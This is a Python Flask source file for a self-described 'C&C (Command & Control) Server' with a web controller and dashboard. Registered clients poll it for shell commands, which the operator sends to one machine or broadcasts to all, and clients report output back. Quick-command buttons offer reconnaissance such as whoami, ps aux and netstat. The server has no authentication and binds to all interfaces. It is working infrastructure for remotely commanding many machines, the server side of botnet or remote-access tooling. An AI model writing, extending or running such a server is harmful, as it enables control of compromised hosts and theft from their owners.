#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import threading
import time
import json
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from flask_cors import CORS
import uuid
from pathlib import Path

app = Flask(__name__, static_folder='static', static_url_path='/static')
CORS(app)

# Config
PORT = 5000
LOG_DIR = Path('./logs')
LOG_DIR.mkdir(exist_ok=True)

# Global state
connected_clients = {}
pending_commands = {}
command_history = []

class PythonCCServer:
    def __init__(self):
        self.device_id = self.generate_device_id()
        self.device_name = self.get_device_name()
        self.username = self.get_username()
        self.platform_info = platform.system()
        self.start_time = datetime.utcnow()
        self.total_commands = 0

    def generate_device_id(self):
        try:
            hostname = socket.gethostname()
            mac = uuid.getnode()
            return f"{hostname}-{mac}".lower()
        except:
            return f"python-cc-{int(time.time())}"

    def get_device_name(self):
        try:
            return socket.gethostname()
        except:
            return "Python-CC-Server"

    def get_username(self):
        try:
            return os.getlogin()
        except:
            return os.environ.get('USER', 'unknown')

    def print_banner(self):
        banner = f"""
╔════════════════════════════════════════════════════════════════╗
║          Python C&C (Command & Control) Server v2.0            ║
║  Web Controller + Multiple Clients Management                  ║
╚════════════════════════════════════════════════════════════════╝

📍 Server Name: {self.device_name}
🆔 Device ID: {self.device_id}
👤 User: {self.username}
🖥️  Platform: {self.platform_info}
🌐 Web URL: http://localhost:{PORT}
🎮 Dashboard: http://localhost:{PORT}/dashboard
📊 Web Controller: http://localhost:{PORT}/controller
📡 API: http://localhost:{PORT}/api

🚀 Starting C&C Server...
⏰ Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}

Connected Clients: {len(connected_clients)}
"""
        print(banner)

cc_server = PythonCCServer()

# ============= API Routes =============

@app.route('/api/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('clientId') or str(uuid.uuid4())
    
    client = {
        'id': client_id,
        'name': data.get('clientName', 'Unknown'),
        'username': data.get('username', 'unknown'),
        'platform': data.get('platform', 'unknown'),
        'connected_at': datetime.utcnow().isoformat(),
        'last_ping': time.time(),
        'total_commands': 0,
        'status': 'online'
    }

    connected_clients[client_id] = client
    log_message(f"✓ Client registered: {client['name']} ({client_id})")

    return jsonify({
        'success': True,
        'clientId': client_id,
        'message': f'Registered as {client["name"]}'
    })

@app.route('/api/unregister', methods=['POST'])
def unregister_client():
    data = request.json
    client_id = data.get('clientId')
    
    if client_id in connected_clients:
        client = connected_clients.pop(client_id)
        log_message(f"✗ Client unregistered: {client['name']}")
    
    return jsonify({'success': True})

@app.route('/api/ping', methods=['POST'])
def ping():
    data = request.json
    client_id = data.get('clientId')
    
    if client_id in connected_clients:
        connected_clients[client_id]['last_ping'] = time.time()
        connected_clients[client_id]['status'] = 'online'
    
    return jsonify({
        'success': True,
        'serverTime': datetime.utcnow().isoformat(),
        'pendingCommand': pending_commands.get(client_id)
    })

@app.route('/api/get-command', methods=['POST'])
def get_command():
    data = request.json
    client_id = data.get('clientId')
    
    if client_id not in connected_clients:
        return jsonify({'success': False, 'error': 'Client not registered'}), 404

    connected_clients[client_id]['last_ping'] = time.time()
    
    if client_id in pending_commands:
        cmd = pending_commands.pop(client_id)
        return jsonify({'success': True, 'data': cmd})

    return jsonify({'success': True, 'data': None})

@app.route('/api/send-output', methods=['POST'])
def send_output():
    data = request.json
    client_id = data.get('clientId')
    command = data.get('command')
    output = data.get('output', '')
    error = data.get('error', '')
    cmd_id = data.get('commandId')

    if client_id not in connected_clients:
        return jsonify({'success': False, 'error': 'Client not registered'}), 404

    client = connected_clients[client_id]
    client['total_commands'] += 1
    
    # Log
    log_file = LOG_DIR / f"client_{client_id}.log"
    with open(log_file, 'a') as f:
        f.write(f"\n[{datetime.utcnow().isoformat()}] Command ID: {cmd_id}\n")
        f.write(f"Command: {command}\n")
        f.write(f"Output:\n{output or error}\n")
        f.write("="*80 + "\n")

    # Lưu command history
    command_history.append({
        'id': cmd_id,
        'clientId': client_id,
        'clientName': client['name'],
        'command': command,
        'output': output[:500] if output else '',
        'error': error[:500] if error else '',
        'timestamp': datetime.utcnow().isoformat()
    })

    log_message(f"📥 Output from {client['name']}: {command}")

    return jsonify({'success': True, 'message': 'Output received'})

@app.route('/api/clients', methods=['GET'])
def get_clients():
    clients_list = []
    for client_id, client in connected_clients.items():
        clients_list.append({
            'id': client_id,
            'name': client['name'],
            'username': client['username'],
            'platform': client['platform'],
            'connectedAt': client['connected_at'],
            'lastPing': client['last_ping'],
            'totalCommands': client['total_commands'],
            'status': client['status']
        })
    
    return jsonify({
        'success': True,
        'totalClients': len(connected_clients),
        'clients': clients_list
    })

@app.route('/api/send-command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('clientId')
    command = data.get('command')
    broadcast = data.get('broadcast', False)

    if not command:
        return jsonify({'success': False, 'error': 'Command required'}), 400

    cmd_id = str(uuid.uuid4())

    if broadcast:
        for cid in connected_clients.keys():
            pending_commands[cid] = {
                'id': cmd_id,
                'command': command,
                'sentAt': datetime.utcnow().isoformat()
            }
        log_message(f"📤 Broadcast command: {command}")
        return jsonify({
            'success': True,
            'commandId': cmd_id,
            'message': f'Command sent to {len(connected_clients)} clients',
            'targetClients': len(connected_clients)
        })
    else:
        if client_id not in connected_clients:
            return jsonify({'success': False, 'error': 'Client not found'}), 404

        pending_commands[client_id] = {
            'id': cmd_id,
            'command': command,
            'sentAt': datetime.utcnow().isoformat()
        }
        log_message(f"📤 Command to {connected_clients[client_id]['name']}: {command}")
        
        return jsonify({
            'success': True,
            'commandId': cmd_id,
            'message': 'Command sent',
            'targetClient': client_id
        })

@app.route('/api/status', methods=['GET'])
def get_status():
    uptime = datetime.utcnow() - cc_server.start_time
    
    return jsonify({
        'success': True,
        'serverName': cc_server.device_name,
        'deviceId': cc_server.device_id,
        'username': cc_server.username,
        'platform': cc_server.platform_info,
        'startTime': cc_server.start_time.isoformat(),
        'uptime': str(uptime),
        'connectedClients': len(connected_clients),
        'totalCommands': len(command_history),
        'serverTime': datetime.utcnow().isoformat()
    })

@app.route('/api/history', methods=['GET'])
def get_history():
    limit = request.args.get('limit', 100, type=int)
    return jsonify({
        'success': True,
        'total': len(command_history),
        'history': command_history[-limit:]
    })

@app.route('/api/history/<client_id>', methods=['GET'])
def get_client_history(client_id):
    limit = request.args.get('limit', 50, type=int)
    client_history = [h for h in command_history if h['clientId'] == client_id]
    return jsonify({
        'success': True,
        'total': len(client_history),
        'history': client_history[-limit:]
    })

@app.route('/api/logs/<client_id>', methods=['GET'])
def get_client_log(client_id):
    log_file = LOG_DIR / f"client_{client_id}.log"
    if log_file.exists():
        with open(log_file, 'r') as f:
            content = f.read()
        return jsonify({'success': True, 'log': content})
    return jsonify({'success': False, 'error': 'Log not found'}), 404

# ============= Web Routes =============

@app.route('/')
def index():
    return redirect('/controller')

@app.route('/controller')
def controller():
    return render_template_string(CONTROLLER_HTML)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

# ============= Utilities =============

def log_message(message):
    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    print(f"[{timestamp}] {message}")
    
    log_file = LOG_DIR / "cc_server.log"
    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")

from flask import redirect

# ============= HTML Templates =============

CONTROLLER_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Python C&C Web Controller</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        .navbar {
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            padding: 15px 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .navbar h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .navbar-info {
            display: flex;
            gap: 30px;
            font-size: 14px;
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-badge {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #10b981;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 20px;
            margin-bottom: 20px;
        }

        .panel {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }

        .panel h2 {
            color: #667eea;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 20px;
        }

        .clients-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            max-height: 500px;
            overflow-y: auto;
        }

        .client-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            border: 2px solid transparent;
        }

        .client-card:hover {
            transform: translateX(5px);
            box-shadow: 0 8px 16px rgba(102, 126, 234, 0.4);
        }

        .client-card.active {
            border-color: #10b981;
            box-shadow: 0 8px 16px rgba(16, 185, 129, 0.4);
        }

        .client-name {
            font-weight: bold;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .client-info {
            font-size: 12px;
            opacity: 0.9;
            margin-top: 8px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 5px;
        }

        .command-panel {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .command-input-group {
            display: flex;
            gap: 10px;
        }

        input[type="text"] {
            flex: 1;
            padding: 12px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }

        button {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-send {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-send:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 16px rgba(102, 126, 234, 0.4);
        }

        .btn-broadcast {
            background: #f59e0b;
            color: white;
            flex: 1;
        }

        .btn-broadcast:hover {
            background: #d97706;
        }

        .btn-broadcast.active {
            background: #10b981;
        }

        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
        }

        .quick-btn {
            background: #f3f4f6;
            border: 1px solid #e5e7eb;
            padding: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }

        .quick-btn:hover {
            background: #667eea;
            color: white;
            border-color: #667eea;
        }

        .output-area {
            background: #0f172a;
            color: #10b981;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            border: 1px solid #667eea;
        }

        .output-line {
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .output-error {
            color: #ef4444;
        }

        .output-success {
            color: #10b981;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-number {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 12px;
            opacity: 0.9;
        }

        .no-clients {
            text-align: center;
            padding: 40px;
            color: #9ca3af;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }

            .clients-grid {
                max-height: 200px;
            }
        }

        .scrollbar::-webkit-scrollbar {
            width: 8px;
        }

        .scrollbar::-webkit-scrollbar-track {
            background: #f1f5f9;
            border-radius: 10px;
        }

        .scrollbar::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navbar -->
        <div class="navbar">
            <h1>
                <i class="fas fa-network-wired"></i>
                Python C&C Web Controller
            </h1>
            <div class="navbar-info">
                <div class="info-item">
                    <span class="status-badge"></span>
                    Clients: <strong id="client-count">0</strong>
                </div>
                <div class="info-item">
                    Time: <strong id="current-time">--:--:--</strong>
                </div>
            </div>
        </div>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-clients">0</div>
                <div class="stat-label">Connected Clients</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="total-commands">0</div>
                <div class="stat-label">Total Commands</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="server-uptime">0d</div>
                <div class="stat-label">Server Uptime</div>
            </div>
        </div>

        <!-- Main Grid -->
        <div class="main-grid">
            <!-- Clients List -->
            <div class="panel">
                <h2><i class="fas fa-laptop"></i> Connected Clients</h2>
                <div class="clients-grid scrollbar" id="clients-container">
                    <div class="no-clients">No clients connected</div>
                </div>
            </div>

            <!-- Command Panel -->
            <div class="panel">
                <h2><i class="fas fa-terminal"></i> Command Control</h2>
                <div class="command-panel">
                    <!-- Input -->
                    <div class="command-input-group">
                        <input type="text" id="command-input" placeholder="Enter command..." />
                        <button class="btn-send" onclick="sendCommand()">
                            <i class="fas fa-paper-plane"></i> Send
                        </button>
                        <button class="btn-broadcast" id="broadcast-btn" onclick="toggleBroadcast()">
                            <i class="fas fa-broadcast-tower"></i> All
                        </button>
                    </div>

                    <!-- Quick Commands -->
                    <div>
                        <strong style="color: #667eea; margin-bottom: 10px; display: block;">Quick Commands:</strong>
                        <div class="quick-commands">
                            <button class="quick-btn" onclick="setCommand('ls -la')"><i class="fas fa-folder"></i> ls -la</button>
                            <button class="quick-btn" onclick="setCommand('pwd')"><i class="fas fa-map-marker"></i> pwd</button>
                            <button class="quick-btn" onclick="setCommand('whoami')"><i class="fas fa-user"></i> whoami</button>
                            <button class="quick-btn" onclick="setCommand('date')"><i class="fas fa-clock"></i> date</button>
                            <button class="quick-btn" onclick="setCommand('df -h')"><i class="fas fa-hdd"></i> df -h</button>
                            <button class="quick-btn" onclick="setCommand('ps aux')"><i class="fas fa-cogs"></i> ps aux</button>
                            <button class="quick-btn" onclick="setCommand('cat /etc/os-release')"><i class="fas fa-info-circle"></i> OS Info</button>
                            <button class="quick-btn" onclick="setCommand('netstat -an')"><i class="fas fa-network-wired"></i> Netstat</button>
                        </div>
                    </div>

                    <!-- Output -->
                    <div class="output-area scrollbar" id="output-display"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = '/api';
        let selectedClient = null;
        let broadcastMode = false;

        // Update time
        setInterval(() => {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleTimeString();
        }, 1000);

        // Load status
        async function loadStatus() {
            try {
                const res = await fetch(`${API_URL}/status`);
                const data = await res.json();
                document.getElementById('total-clients').textContent = data.connectedClients;
                document.getElementById('client-count').textContent = data.connectedClients;
                document.getElementById('total-commands').textContent = data.totalCommands;
                
                // Calculate uptime
                const uptime = new Date() - new Date(data.startTime);
                const days = Math.floor(uptime / (1000 * 60 * 60 * 24));
                const hours = Math.floor((uptime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                document.getElementById('server-uptime').textContent = `${days}d ${hours}h`;
            } catch (e) {
                console.error('Error:', e);
            }
        }

        // Load clients
        async function loadClients() {
            try {
                const res = await fetch(`${API_URL}/clients`);
                const data = await res.json();
                const container = document.getElementById('clients-container');
                
                if (data.clients.length === 0) {
                    container.innerHTML = '<div class="no-clients">⏳ Waiting for clients...</div>';
                    return;
                }

                container.innerHTML = data.clients.map(client => `
                    <div class="client-card ${selectedClient?.id === client.id ? 'active' : ''}"
                         onclick="selectClient('${client.id}', '${client.name}')">
                        <div class="client-name">
                            <i class="fas fa-laptop"></i>
                            ${client.name}
                        </div>
                        <div class="client-info">
                            <div>👤 ${client.username}</div>
                            <div>🖥️ ${client.platform}</div>
                            <div>📊 Commands: ${client.totalCommands}</div>
                            <div>📡 ${client.status}</div>
                        </div>
                    </div>
                `).join('');
            } catch (e) {
                console.error('Error:', e);
            }
        }

        function selectClient(clientId, clientName) {
            selectedClient = { id: clientId, name: clientName };
            broadcastMode = false;
            document.getElementById('broadcast-btn').classList.remove('active');
            loadClients();
        }

        function toggleBroadcast() {
            broadcastMode = !broadcastMode;
            document.getElementById('broadcast-btn').classList.toggle('active');
        }

        function setCommand(cmd) {
            document.getElementById('command-input').value = cmd;
            document.getElementById('command-input').focus();
        }

        async function sendCommand() {
            const cmd = document.getElementById('command-input').value.trim();
            if (!cmd) return;

            if (!selectedClient && !broadcastMode) {
                alert('Select a client or enable broadcast mode');
                return;
            }

            try {
                const res = await fetch(`${API_URL}/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        clientId: selectedClient?.id,
                        command: cmd,
                        broadcast: broadcastMode
                    })
                });

                const data = await res.json();
                const output = document.getElementById('output-display');
                
                if (data.success) {
                    const timestamp = new Date().toLocaleTimeString();
                    const target = broadcastMode ? `All Clients (${data.targetClients})` : selectedClient.name;
                    output.innerHTML += `<div class="output-line output-success">[${timestamp}] ➜ ${target} $ ${cmd}</div>`;
                    output.innerHTML += `<div class="output-line output-success">✓ ${data.message}</div><br>`;
                    output.scrollTop = output.scrollHeight;
                }
            } catch (e) {
                console.error('Error:', e);
            }

            document.getElementById('command-input').value = '';
        }

        // Auto-refresh
        setInterval(loadStatus, 1000);
        setInterval(loadClients, 2000);

        // Enter to send
        document.getElementById('command-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendCommand();
        });

        // Initial load
        loadStatus();
        loadClients();
    </script>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C&C Dashboard</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .header h1 {
            color: #333;
            margin-bottom: 10px;
        }

        table {
            width: 100%;
            background: white;
            border-collapse: collapse;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        th {
            background: #667eea;
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: bold;
        }

        td {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
        }

        tr:hover {
            background: #f9f9f9;
        }

        .status-badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }

        .status-online {
            background: #d4edda;
            color: #155724;
        }

        .status-offline {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 C&C Dashboard</h1>
            <p>Command History & Client Statistics</p>
        </div>

        <h3 style="margin-bottom: 15px;">Recent Commands</h3>
        <table id="history-table">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Client</th>
                    <th>Command</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody id="history-body"></tbody>
        </table>
    </div>

    <script>
        async function loadHistory() {
            try {
                const res = await fetch('/api/history?limit=50');
                const data = await res.json();
                const body = document.getElementById('history-body');
                
                body.innerHTML = data.history.map(h => `
                    <tr>
                        <td>${new Date(h.timestamp).toLocaleTimeString()}</td>
                        <td>${h.clientName}</td>
                        <td><code>${h.command}</code></td>
                        <td><span class="status-badge ${h.error ? 'status-offline' : 'status-online'}">
                            ${h.error ? 'Error' : 'Success'}
                        </span></td>
                    </tr>
                `).join('');
            } catch (e) {
                console.error('Error:', e);
            }
        }

        loadHistory();
        setInterval(loadHistory, 3000);
    </script>
</body>
</html>
'''

# ============= Main =============

if __name__ == '__main__':
    cc_server.print_banner()
    
    try:
        print(f"\n🚀 Starting Flask server on http://localhost:{PORT}\n")
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
    except KeyboardInterrupt:
        print("\n\n👋 Shutting down...")
    except Exception as e:
        print(f"\n❌ Error: {e}")